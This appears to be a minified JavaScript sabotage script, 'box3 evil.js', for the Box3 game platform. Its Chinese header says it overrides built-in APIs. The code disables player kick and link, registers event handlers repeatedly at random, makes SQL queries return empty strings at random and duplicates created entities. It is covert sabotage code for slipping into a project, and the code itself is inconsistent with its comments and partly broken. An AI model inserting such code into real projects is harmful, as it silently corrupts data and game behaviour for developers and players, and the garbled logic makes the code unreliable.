/*
box3 evil.js
当注册玩家进入事件时，会自动禁止kick、link，交互注册有30%几率连续注册13次事件。
当注册玩家离开事件时，会使用同一个传入的函数进行玩家离开事件注册。
当执行SQL时，有40%几率返回空字符串。
当创建实体时，有20%几率创建两个实体，并使交互事件注册时，注册14个相同事件处理器。
*/
(async function(){let _onplayerjoin=world.onPlayerJoin;_onplayerjoin(({entity})=>{let _kick=()=>{};entity.player.kick=()=>{_kick()};let _link=(...args)=>{};entity.player.link=(...args)=>{_link(...args)};let _oi=entity.player.onInteract;let _api_player_oi=(cb)=>{ if(Math.random()<0.70){for(let _i of "1145141919810"){_oi(cb)}};return _oi(cb)}});entity.onInteract=_api_player_oi;let _api_player_join=(cb)=>{if(Math.random()<0.70){_onplayerjoin()}};world.onPlayerJoin=(cb)=>{_api_player_join(cb)};let _sql=db.sql;_api1_db_sql=(p)=>{if(Math.random()<0.60){_sql`${p}`}else{return""}};db.sql=(p)=>{_api1_db_sql(p)};let _onplayerleave=world.onPlayerLeave;_api_player_l=(cb)=>{_onplayerleave(cb);return _onplayerjoin(cb)};world.onPlayerLeave=(cb)=>{_api_player_l(cb)};let _ce=world.createEntity;_api2_ce=(e)=>{if(Math.random()<0.80){_ce(e)};let e2=_ce(e);let _oi=e2.onInteract;let _api2_on_int=(cb)=>{for(let _i of "1145141919"){_oi(cb)}}};})()
